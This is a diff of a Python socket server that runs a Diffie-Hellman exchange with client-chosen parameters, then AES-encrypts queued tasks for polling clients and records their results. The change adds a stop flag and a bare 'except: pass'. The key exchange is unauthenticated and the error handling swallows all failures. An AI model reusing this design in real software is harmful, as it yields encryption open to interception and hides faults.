@@ -20,6 +20,7 @@ class Server:
             self.shared_key = None
             self.todo = ''
             self.result = ''
+            self.cond = True
         except ValueError as e:
             print("Cannot initialized")
             return
@@ -35,53 +36,53 @@ class Server:
         self.todo = to_do
 
     def listen(self, server_socket):
-        while True:
-            (client_socket, address) = server_socket.accept()
+        while self.cond:
             try:
-                data_bytes = client_socket.recv(RECV_LENGTH)
-                data = None
+                (client_socket, address) = server_socket.accept()
                 try:
-                    data = bytes(data_bytes).decode()
-                except:
-                    data = data_bytes
-                if data is not None and data == '':
-                    print(CLOSE_CON_MSG)
-                else:
-                    if data is not None and data.split()[0] == "1":
-                        self.p = int(data.split()[1])
-                        self.g = int(data.split()[2])
-                        self.public_key = pow(self.g, self.private_key, self.p)
-                        client_socket.send(str("2 " + str(self.public_key)).encode())
-                    elif data is not None and data.split()[0] == "2":
-                        self.shared_key = pow(int(data.split()[1]), self.private_key, self.p)
-                        client_socket.send(str("2 " + str(self.public_key)).encode())
-                        print("key changed!")
+                    data_bytes = client_socket.recv(RECV_LENGTH)
+                    data = None
+                    try:
+                        data = bytes(data_bytes).decode()
+                    except:
+                        data = data_bytes
+                    if data is not None and data == '':
+                        print(CLOSE_CON_MSG)
                     else:
-                        cipher = AESCipher(str(self.shared_key))
-                        data_decrypt = cipher.decrypt(data).decode()
-                        print(data_decrypt[2:])
-                        if data_decrypt.split()[0] == "3":
-                            if self.todo:
-                                cipher_text = cipher.encrypt(str('3 ' + self.todo))
+                        if data is not None and data.split()[0] == "1":
+                            self.p = int(data.split()[1])
+                            self.g = int(data.split()[2])
+                            self.public_key = pow(self.g, self.private_key, self.p)
+                            client_socket.send(str("2 " + str(self.public_key)).encode())
+                        elif data is not None and data.split()[0] == "2":
+                            self.shared_key = pow(int(data.split()[1]), self.private_key, self.p)
+                            client_socket.send(str("2 " + str(self.public_key)).encode())
+                            print("key changed!")
+                        else:
+                            cipher = AESCipher(str(self.shared_key))
+                            data_decrypt = cipher.decrypt(data).decode()
+                            print(data_decrypt[2:])
+                            if data_decrypt.split()[0] == "3":
+                                if self.todo:
+                                    cipher_text = cipher.encrypt(str('3 ' + self.todo))
+                                    client_socket.send(cipher_text)
+                            elif data_decrypt.split()[0] == "4":
+                                self.result = data_decrypt[2:]
+                                cipher_text = cipher.encrypt('4 Thanks')
                                 client_socket.send(cipher_text)
-                        elif data_decrypt.split()[0] == "4":
-                            self.result = data_decrypt[2:]
-                            cipher_text = cipher.encrypt('4 Thanks')
-                            client_socket.send(cipher_text)
-                # client_socket.close()
-            except ValueError as e:
-                print("The client not available")
-            finally:
-                client_socket.close()
+                    # client_socket.close()
+                except ValueError as e:
+                    print("The client not available")
+                finally:
+                    client_socket.close()
+            except:
+                pass
 
     def run(self):
-        server_socket = socket.socket()
-        server_socket.bind((IP_ADDRESS, PORT))
-        server_socket.listen(LISTEN_COUNT)
-        threading.Thread(target=self.listen, args=(server_socket, )).start()
-        # t1.join()
-        while True:
-            self.get_input()
+        self.server_socket = socket.socket()
+        self.server_socket.bind((IP_ADDRESS, PORT))
+        self.server_socket.listen(LISTEN_COUNT)
+        threading.Thread(target=self.listen, args=(self.server_socket, )).start()
 
 
 def main():
